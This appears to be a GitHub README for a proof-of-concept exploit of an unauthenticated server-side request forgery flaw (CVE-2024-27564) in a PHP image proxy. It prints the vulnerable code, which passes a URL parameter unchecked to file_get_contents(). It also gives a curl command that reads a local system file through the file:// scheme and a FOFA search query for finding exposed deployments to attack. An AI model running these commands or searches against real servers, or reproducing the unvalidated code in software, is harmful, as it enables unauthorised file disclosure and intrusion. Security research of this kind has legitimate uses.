    # SSRF-Exploit-CVE-2024-27564


# Project Title

This project demonstrates a Server-Side Request Forgery (SSRF) vulnerability in the `pictureproxy.php` file.

## Description

A vulnerability in `pictureproxy.php` allows remote attackers to perform arbitrary requests by injecting URLs into the `url` parameter. This SSRF vulnerability can be exploited without authentication, making it particularly dangerous. 

The vulnerable code is in the `pictureproxy.php` file. The issue occurs because the function does not properly validate the `url` parameter. The `$_GET['url']` variable is passed to the `file_get_contents()` function, which fetches content from the specified URL. This can lead to SSRF.

## Proof of Concept

Here is a simple proof of concept that shows how the vulnerability can be exploited:

```php
<?php
if (isset($_GET['url'])) {
    $image = file_get_contents($_GET['url']);
    header("Content-type: image/jpeg");
    echo $image;
} else {
    echo "Invalid request";
}
```

To test the vulnerability, you can use the following curl command:

```bash
curl -i -s -k http://127.0.0.1/pictureproxy.php?url=file:///etc/password
```

### Tested with Open Redirect

A test using an open redirect vulnerability:

```bash
https://64.media.tumblr.com/f07b73b374dc2ff6d5e4dbf39d2a6467/tumblr_nvani31DCm1u5url1o1_1280.jpg
```

![Banner](poc.png)

## Tools

- **FOFA**: A search engine for Internet devices and vulnerabilities. Use the following command to search for relevant results:
```bash
"title="ChatGPT个人专用版""
```

## Conclusion

This project highlights the importance of properly validating user inputs to avoid SSRF vulnerabilities. Always ensure that parameters like URLs are thoroughly checked before being processed.
